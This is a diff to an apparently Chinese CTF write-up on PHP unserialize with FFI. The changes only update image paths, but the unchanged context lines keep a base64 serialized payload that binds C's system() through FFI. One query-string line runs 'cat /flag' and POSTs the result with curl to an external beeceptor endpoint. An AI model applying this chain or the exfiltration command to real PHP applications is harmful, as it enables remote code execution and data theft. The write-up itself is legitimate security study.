@@ -140,7 +140,7 @@ echo base64_encode(serialize(new A()));
 
 传入`?a=var_dump(unserialize(base64_decode("QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319")));`
 
-![](<../../.gitbook/assets/image (34) (1) (1).png>)
+![](<../../.gitbook/assets/image (34) (1) (1) (1).png>)
 
 触发`A::run()`从而把FFI对象返回给`A->data['ret']`，再用`A::__get()`函数就可以获取FFI对象了
 
@@ -155,7 +155,7 @@ echo base64_encode(serialize(new A()));
 ?a=var_dump(unserialize(base64_decode("QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319"))->__get('ret')->system("echo `cat /flag` > 1.txt;curl -v -X POST 'https://peri0d.free.beeceptor.com/my/api/' -d @1.txt"));
 ```
 
-![](<../../.gitbook/assets/image (35) (1).png>)
+![](<../../.gitbook/assets/image (35) (1) (1).png>)
 
 ## 小结
 
